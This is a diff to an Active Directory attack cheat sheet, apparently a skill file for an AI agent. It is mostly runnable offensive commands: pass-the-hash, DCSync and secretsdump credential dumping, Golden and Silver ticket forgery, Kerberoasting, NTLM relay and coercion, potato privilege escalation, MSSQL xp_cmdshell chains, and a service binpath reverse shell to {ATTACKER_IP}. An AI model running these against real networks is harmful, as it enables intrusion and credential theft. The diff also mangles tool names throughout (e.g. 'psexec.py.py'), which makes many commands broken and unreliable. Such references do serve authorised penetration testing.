@@ -11,10 +11,10 @@ allowed-tools: Read
 ```bash
 evil-winrm -i {IP} -u '{USER}' -p '{PASS}'
 evil-winrm -i {IP} -u '{USER}' -H {NT_HASH}
-psexec.py {DOMAIN}/{USER}:'{PASS}'@{IP}
-psexec.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH}
-wmiexec.py {DOMAIN}/{USER}:'{PASS}'@{IP}
-wmiexec.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH}
+psexec.py.py {DOMAIN}/{USER}:'{PASS}'@{IP}
+psexec.py.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH}
+wmiexec.py.py {DOMAIN}/{USER}:'{PASS}'@{IP}
+wmiexec.py.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH}
 smbexec.py {DOMAIN}/{USER}:'{PASS}'@{IP}       # service-based, noisier
 dcomexec.py {DOMAIN}/{USER}:'{PASS}'@{IP}      # DCOM-based
 atexec.py {DOMAIN}/{USER}:'{PASS}'@{IP} whoami # scheduled task exec
@@ -24,34 +24,34 @@ xfreerdp /v:{IP} /u:{USER} /p:'{PASS}' /cert-ignore /dynamic-resolution
 ## Pass-the-Hash (NTLM)
 ```bash
 evil-winrm -i {IP} -u '{USER}' -H {NT_HASH}
-netexec smb {IP} -u '{USER}' -H {NT_HASH} --shares
-netexec winrm {IP} -u '{USER}' -H {NT_HASH} -x whoami
-psexec.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH}
-secretsdump.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH} -just-dc
+nxc smb {IP} -u '{USER}' -H {NT_HASH} --shares
+nxc winrm {IP} -u '{USER}' -H {NT_HASH} -x whoami
+psexec.py.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH}
+secretsdump.py.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH} -just-dc
 ```
 
 ## Pass-the-Ticket (Kerberos)
 ```bash
 export KRB5CCNAME={ticket.ccache}
-psexec.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
-wmiexec.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
+psexec.py.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
+wmiexec.py.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
 evil-winrm -i {DC_FQDN} -r {DOMAIN}
-netexec smb {TARGET_FQDN} -k --use-kcache
+nxc smb {TARGET_FQDN} -k --use-kcache
 ```
 
 ## Overpass-the-Hash (NT hash → TGT)
 ```bash
-getTGT.py {DOMAIN}/{USER} -hashes :{NT_HASH} -dc-ip {IP}
+getTGT.py.py {DOMAIN}/{USER} -hashes :{NT_HASH} -dc-ip {IP}
 export KRB5CCNAME={USER}.ccache
 # Now use Kerberos flows above
 ```
 
 ## DCSync
 ```bash
-secretsdump.py {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
-secretsdump.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH} -just-dc
-secretsdump.py {DOMAIN}/{USER}@{IP} -k -no-pass -just-dc
-netexec smb {IP} -u '{USER}' -p '{PASS}' --ntds
+secretsdump.py.py {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
+secretsdump.py.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH} -just-dc
+secretsdump.py.py {DOMAIN}/{USER}@{IP} -k -no-pass -just-dc
+nxc smb {IP} -u '{USER}' -p '{PASS}' --ntds
 # After DCSync → dump krbtgt hash → Golden Ticket (see below)
 ```
 
@@ -59,12 +59,12 @@ netexec smb {IP} -u '{USER}' -p '{PASS}' --ntds
 After obtaining the krbtgt NT hash via DCSync, forge TGTs for any user indefinitely.
 ```bash
 # Get domain SID first
-lookupsid.py {DOMAIN}/{USER}:'{PASS}'@{IP}   # SID = S-1-5-21-...
+lookupsid.py.py {DOMAIN}/{USER}:'{PASS}'@{IP}   # SID = S-1-5-21-...
 
 # Forge Golden Ticket
 ticketer.py -nthash {KRBTGT_NT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} administrator
 export KRB5CCNAME=administrator.ccache
-psexec.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
+psexec.py.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
 
 # With PAC (more realistic, avoids some detections)
 ticketer.py -nthash {KRBTGT_NT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -groups 512,513,518,519,520 administrator
@@ -73,10 +73,10 @@ ticketer.py -nthash {KRBTGT_NT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -
 ## Silver Ticket (service-specific, stealthier than Golden)
 Forge TGS for a specific service using the service account's NT hash — never touches the DC.
 ```bash
-# Get machine account hash via secretsdump
+# Get machine account hash via secretsdump.py
 ticketer.py -nthash {SERVICE_NT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -spn cifs/{TARGET_FQDN} administrator
 export KRB5CCNAME=administrator.ccache
-psexec.py {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
+psexec.py.py {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
 
 # Common SPNs for Silver Tickets:
 # cifs/{FQDN}   → SMB/file access
@@ -88,62 +88,62 @@ psexec.py {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
 
 ## Kerberoasting
 ```bash
-netexec ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
-GetUserSPNs.py {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP} -request
+nxc ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
+GetUserSPNs.py.py {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP} -request
 hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
 # rockyou fails → not the intended path, pivot immediately
 ```
 
 ## AS-REP Roasting
 ```bash
-netexec ldap {IP} -u '{USER}' -p '{PASS}' --asreproast asrep.txt
-GetNPUsers.py {DOMAIN}/ -dc-ip {IP} -no-pass -usersfile users.txt
+nxc ldap {IP} -u '{USER}' -p '{PASS}' --asreproast asrep.txt
+GetNPUsers.py.py {DOMAIN}/ -dc-ip {IP} -no-pass -usersfile users.txt
 hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ## Password spraying
 ```bash
 kerbrute passwordspray --dc {IP} -d {DOMAIN} users.txt '{PASSWORD}'   # Kerberos, avoids LDAP logs
-netexec smb {IP} -u users.txt -p '{PASS}' --continue-on-success
-netexec ldap {IP} -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
-# Check lockout policy first: netexec ldap {IP} -u '{USER}' -p '{PASS}' --pass-pol
+nxc smb {IP} -u users.txt -p '{PASS}' --continue-on-success
+nxc ldap {IP} -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+# Check lockout policy first: nxc ldap {IP} -u '{USER}' -p '{PASS}' --pass-pol
 ```
 
 ## Constrained delegation (S4U2Self + S4U2Proxy)
 ```bash
 # Check msDS-AllowedToDelegateTo in BloodHound (AllowedToDelegate edge)
-getST.py -spn '{SPN}' -impersonate administrator -dc-ip {IP} '{DOMAIN}/{USER}:{PASS}'
+getST.py.py -spn '{SPN}' -impersonate administrator -dc-ip {IP} '{DOMAIN}/{USER}:{PASS}'
 export KRB5CCNAME=administrator@{SPN}.ccache
-psexec.py {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
+psexec.py.py {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
 
 # With NT hash
-getST.py -spn '{SPN}' -impersonate administrator -dc-ip {IP} {DOMAIN}/{USER} -hashes :{NT_HASH}
+getST.py.py -spn '{SPN}' -impersonate administrator -dc-ip {IP} {DOMAIN}/{USER} -hashes :{NT_HASH}
 ```
 
 ## RBCD (Resource-Based Constrained Delegation)
 ```bash
 # Requires: machine account + write access to msDS-AllowedToActOnBehalfOfOtherIdentity on target
 # Step 1: Create attacker machine account (if MachineAccountQuota > 0)
-addcomputer.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'ATTACKER$' -computer-pass 'Attacker123!' -dc-ip {IP}
+addcomputer.py.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'ATTACKER$' -computer-pass 'Attacker123!' -dc-ip {IP}
 
 # Step 2: Write RBCD
 bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object '{TARGET}$' msDS-AllowedToActOnBehalfOfOtherIdentity -v '{ATTACKER_SID}'
 
 # Step 3: Get service ticket impersonating administrator
-getST.py -spn cifs/{TARGET_FQDN} -impersonate administrator {DOMAIN}/ATTACKER$ -hashes :{NT_HASH} -dc-ip {IP}
+getST.py.py -spn cifs/{TARGET_FQDN} -impersonate administrator {DOMAIN}/ATTACKER$ -hashes :{NT_HASH} -dc-ip {IP}
 export KRB5CCNAME=administrator@cifs_{TARGET}.ccache
-psexec.py {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
+psexec.py.py {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
 ```
 
 ## Unconstrained delegation (full flow — Delegate pattern)
 Requires: machine with unconstrained delegation + ability to coerce DC auth
 ```bash
 # 1. Check MachineAccountQuota (default 10)
-netexec ldap {IP} -u '{USER}' -p '{PASS}' -M maq
+nxc ldap {IP} -u '{USER}' -p '{PASS}' -M maq
 
 # 2. Create machine account with unconstrained delegation
 #    Requires SeEnableDelegationPrivilege OR GenericAll on machine account
-addcomputer.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'UNCDEL$' -computer-pass 'Uncdel123!' -dc-ip {IP}
+addcomputer.py.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'UNCDEL$' -computer-pass 'Uncdel123!' -dc-ip {IP}
 bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object 'UNCDEL$' userAccountControl -v 528384
 
 # 3. Add DNS record pointing to attacker machine
@@ -158,7 +158,7 @@ python3 printerbug.py {DOMAIN}/{USER}:'{PASS}'@{DC_FQDN} UNCDEL.{DOMAIN}
 
 # 6. krbrelayx captures DC TGT → use it
 export KRB5CCNAME={DC}$.ccache
-secretsdump.py -k -no-pass {DOMAIN}/{DC}$@{DC_FQDN}
+secretsdump.py.py -k -no-pass {DOMAIN}/{DC}$@{DC_FQDN}
 ```
 
 ## NTLMRelay + coercion
@@ -169,22 +169,95 @@ ntlmrelayx.py -t ldaps://{DC_IP} --delegate-access --no-smb-server -smb2support
 # Relay to LDAP for shadow creds
 ntlmrelayx.py -t ldaps://{DC_IP} --shadow-credentials --shadow-target '{TARGET}$' --no-smb-server
 
+# Relay to SMB (requires SMB signing disabled on target)
+ntlmrelayx.py -t smb://{TARGET_IP} -smb2support -c 'net localgroup administrators {USER} /add'
+
+# Relay to MSSQL
+ntlmrelayx.py -t mssql://{MSSQL_IP} -smb2support -q 'EXEC sp_configure "show advanced options",1'
+
 # Coercion methods (to trigger relay)
 python3 printerbug.py {DOMAIN}/{USER}:'{PASS}'@{TARGET_FQDN} {ATTACKER_IP}
 python3 PetitPotam.py {ATTACKER_IP} {TARGET_IP}                          # no creds needed
 python3 PetitPotam.py -u '{USER}' -p '{PASS}' -d {DOMAIN} {ATTACKER_IP} {TARGET_IP}
 python3 dfscoerce.py -u '{USER}' -p '{PASS}' -d {DOMAIN} {ATTACKER_IP} {TARGET_IP}
+
+# Coercer — tries ALL coercion methods at once (MS-EFSR, MS-DFSNM, MS-FSRVP, MS-RPRN, etc.)
+coercer coerce -u '{USER}' -p '{PASS}' -d {DOMAIN} -l {ATTACKER_IP} -t {TARGET_IP}
+coercer scan -u '{USER}' -p '{PASS}' -d {DOMAIN} -t {TARGET_IP}         # check what's available
 ```
+
+## SeImpersonatePrivilege / token impersonation (from shell)
+When you have a shell as a service account (IIS, MSSQL, service), check token privileges first.
+```bash
+# Check privileges (from Windows shell)
+whoami /priv
+# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
+
+# PrintSpoofer (works on Windows Server 2019, 2022, Windows 10)
+.\PrintSpoofer.exe -i -c cmd
+.\PrintSpoofer.exe -c "net localgroup administrators {USER} /add"
+
+# GodPotato (broadest compatibility — all Windows from 2012 to 2022)
+.\GodPotato.exe -cmd "cmd /c whoami"
+.\GodPotato.exe -cmd "cmd /c net localgroup administrators {USER} /add"
+
+# JuicyPotatoNG (alternative when PrintSpoofer fails)
+.\JuicyPotatoNG.exe -t * -p "cmd.exe" -a "/c net localgroup administrators {USER} /add"
+
+# SweetPotato (multiple COM methods in one binary)
+.\SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net localgroup administrators {USER} /add"
+```
+**SeImpersonatePrivilege is almost always present on service accounts — check before anything else.**
+
+## SeBackupPrivilege (from shell — Backup Operators path)
+```bash
+# From Windows shell — dump SAM/SYSTEM registry hives
+reg save HKLM\SAM C:\Temp\sam.hive
+reg save HKLM\SYSTEM C:\Temp\sys.hive
+reg save HKLM\SECURITY C:\Temp\sec.hive
+# Download and decrypt locally
+secretsdump.py.py -sam sam.hive -system sys.hive -security sec.hive LOCAL
+
+# NTDS.dit via diskshadow + robocopy (from privileged Windows shell)
+# diskshadow.exe → set context persistent nowriters → add volume C: alias vss → create → expose %vss% Z:
+robocopy /b Z:\Windows\NTDS . ntds.dit
+reg save HKLM\SYSTEM C:\Temp\sys.hive
+secretsdump.py.py -ntds ntds.dit -system sys.hive LOCAL
+```
+
+## MSSQL linked server chains
+```bash
+# Enumerate linked servers (from mssqlclient.py shell)
+SELECT * FROM sys.servers;
+EXEC sp_linkedservers;
+
+# Execute on linked server (single hop)
+SELECT * FROM OPENQUERY([{LINKED_SRV}], 'SELECT SYSTEM_USER')
+EXEC ('SELECT SYSTEM_USER') AT [{LINKED_SRV}]
+
+# Enable xp_cmdshell on linked server
+EXEC ('''sp_configure ''''show advanced options'''',1;RECONFIGURE''') AT [{LINKED_SRV}]
+EXEC ('''sp_configure ''''xp_cmdshell'''',1;RECONFIGURE''') AT [{LINKED_SRV}]
+EXEC ('xp_cmdshell ''whoami''') AT [{LINKED_SRV}]
+
+# Double-hop (A → B → C)
+EXEC ('EXEC (''xp_cmdshell ''''whoami''''; '') AT [{LINKED_B}]') AT [{LINKED_A}]
+
+# Capture Net-NTLMv2 via xp_dirtree (run responder first)
+EXEC xp_dirtree '\\{ATTACKER_IP}\share', 1, 1
+EXEC master..xp_dirtree '\\{ATTACKER_IP}\share'
+```
+**sa or sysadmin on linked server = SYSTEM on that machine via xp_cmdshell.**
 
 ## LAPS
 ```bash
 # Read LAPS password (requires ReadLAPSPassword / AllExtendedRights)
-netexec ldap {IP} -u '{USER}' -p '{PASS}' -M laps
+nxc ldap {IP} -u '{USER}' -p '{PASS}' -M laps
 ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd sAMAccountName
 
 # Use LAPS password
 evil-winrm -i {TARGET_IP} -u administrator -p '{LAPS_PASS}'
-netexec smb {TARGET_IP} -u administrator -p '{LAPS_PASS}' --sam
+nxc smb {TARGET_IP} -u administrator -p '{LAPS_PASS}' --sam
 ```
 
 ## DPAPI credential extraction
@@ -213,7 +286,7 @@ python3 pygpoabuse.py {DOMAIN}/{USER}:'{PASS}'@{DC_IP} -gpo-id '{GPO_ID}' -power
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName backdoor --Author SYSTEM --Command 'cmd.exe' --Arguments '/c net localgroup administrators {USER} /add' --GPOName '{GPO}'
 
 # Force GPO update on target
-netexec smb {TARGET_IP} -u '{USER}' -p '{PASS}' -x 'gpupdate /force'
+nxc smb {TARGET_IP} -u '{USER}' -p '{PASS}' -x 'gpupdate /force'
 ```
 
 ## AD Recycle Bin
@@ -228,7 +301,7 @@ Get-ADObject -Filter {isDeleted -eq $true -and objectClass -eq 'user'} -IncludeD
 
 ## Cross-session relay (RemotePotato0)
 ```bash
-netexec smb {IP} -u '{USER}' -p '{PASS}' --sessions    # find active sessions
+nxc smb {IP} -u '{USER}' -p '{PASS}' --sessions    # find active sessions
 
 # From Windows shell (requires admin to target session)
 .\RemotePotato0.exe -m 2 -s 1 -x {ATTACKER_IP} -p 9998
@@ -238,21 +311,34 @@ netexec smb {IP} -u '{USER}' -p '{PASS}' --sessions    # find active sessions
 ## Domain trust attacks
 ```bash
 # Enumerate trusts
-netexec ldap {IP} -u '{USER}' -p '{PASS}' -M enum_trusts
+nxc ldap {IP} -u '{USER}' -p '{PASS}' -M enum_trusts
 GetADUsers.py -all -dc-ip {IP} {DOMAIN}/{USER}:'{PASS}'
 
 # Child to parent domain (if SID filtering disabled)
 # Get Enterprise Admin SID (S-1-5-21-{PARENT_DOMAIN}-519)
-lookupsid.py {PARENT_DOMAIN}/{USER}:'{PASS}'@{PARENT_DC}
+lookupsid.py.py {PARENT_DOMAIN}/{USER}:'{PASS}'@{PARENT_DC}
 
 # Golden Ticket with SID history to parent domain
 ticketer.py -nthash {CHILD_KRBTGT_HASH} -domain-sid {CHILD_DOMAIN_SID} -domain {CHILD_DOMAIN} -extra-sid {PARENT_EA_SID} administrator
 export KRB5CCNAME=administrator.ccache
-psexec.py {PARENT_DOMAIN}/administrator@{PARENT_DC_FQDN} -k -no-pass
+psexec.py.py {PARENT_DOMAIN}/administrator@{PARENT_DC_FQDN} -k -no-pass
 
 # Cross-forest (if trust allows TGT delegation)
-GetUserSPNs.py -target-domain {TRUSTED_DOMAIN} {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP}
+GetUserSPNs.py.py -target-domain {TRUSTED_DOMAIN} {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP}
 ```
+
+## Server Operators → SYSTEM on DC
+```bash
+# From Windows shell — modify a service to execute your payload as SYSTEM
+sc config {SERVICE} binpath= "cmd /c net localgroup administrators {USER} /add"
+sc stop {SERVICE}
+sc start {SERVICE}
+
+# Or replace binpath with reverse shell (netcat, powershell cradle, etc.)
+sc config {SERVICE} binpath= "cmd /c C:\Temp\nc.exe {ATTACKER_IP} 443 -e cmd"
+sc stop {SERVICE} && sc start {SERVICE}
+```
+**Any service running as LocalSystem works. Safe choices: VSS, wuauserv (Windows Update), AppReadiness.**
 
 ## DCShadow (red team — stealthy persistence)
 Register a rogue DC temporarily to push arbitrary AD changes without touching real DC logs.
@@ -276,34 +362,38 @@ python3 dnstool.py -u '{DOMAIN}\{USER}' -p '{PASS}' --action modify --record '\\
 # Or: dnscmd {DC_FQDN} /config /serverlevelplugindll \\{ATTACKER_IP}\share\evil.dll
 
 # Restart DNS service (triggers DLL load as SYSTEM)
-netexec smb {DC_IP} -u '{USER}' -p '{PASS}' -x 'sc stop dns && sc start dns'
+nxc smb {DC_IP} -u '{USER}' -p '{PASS}' -x 'sc stop dns && sc start dns'
 ```
 
 ## Pivot checklist after each new account
 ```
-1. netexec winrm {IP} → shell available?
-2. netexec smb {IP} --shares → new readable shares?
+1. nxc winrm {IP} → shell available?
+2. nxc smb {IP} --shares → new readable shares?
 3. BloodHound → mark account as owned, check outbound control
 4. certipy find → new ADCS paths?
 5. Group memberships → Backup Operators, Account Operators, DNSAdmins, Remote Management Users
 6. LAPS → can we read any computer's local admin password?
 7. DPAPI → stored credentials, browser passwords, RDP keys
-8. Sessions → netexec smb {IP} --sessions (high-value users logged in?)
-9. Scheduled tasks → netexec smb {IP} -M schtask_as_user
+8. Sessions → nxc smb {IP} --sessions (high-value users logged in?)
+9. Scheduled tasks → nxc smb {IP} -M schtask_as_user
 10. Services running as domain accounts → targeted kerberoast
 ```
 
 ## Gotchas
 - **Always test WinRM first** with new creds — quickest shell
 - **rockyou fails on hash** → pivot, not the intended path
+- **SeImpersonatePrivilege** → almost always present on service accounts; check `whoami /priv` immediately after any service shell
 - **Constrained delegation** → check msDS-AllowedToDelegateTo in BloodHound (AllowedToDelegate edge)
 - **RBCD requires MachineAccountQuota > 0** or existing machine account you own
 - **PetitPotam** → works without creds against unpatched DCs
+- **Coercer** → use instead of manually trying PrinterBug/PetitPotam/DFSCoerce one by one
 - **Golden Ticket** → krbtgt hash never changes unless you rotate it; valid for 10 years by default
 - **Silver Ticket** → not logged at DC, very stealthy; uses service account hash not krbtgt
 - **Protected Users** → PTH fails (no NTLM); use Kerberos flows (PTT/Overpass-the-Hash)
 - **DCShadow** → changes bypass most SIEM rules; effective for red team persistence
 - **DNS restart** for DNSAdmins → logged but DNS outage is brief; clean up after
+- **MSSQL linked servers** → each hop may run as a different user; sa on linked = SYSTEM
+- **Server Operators** → can modify service ImagePath → execute as SYSTEM without needing UAC
 
 ## Key References
 - https://www.ired.team
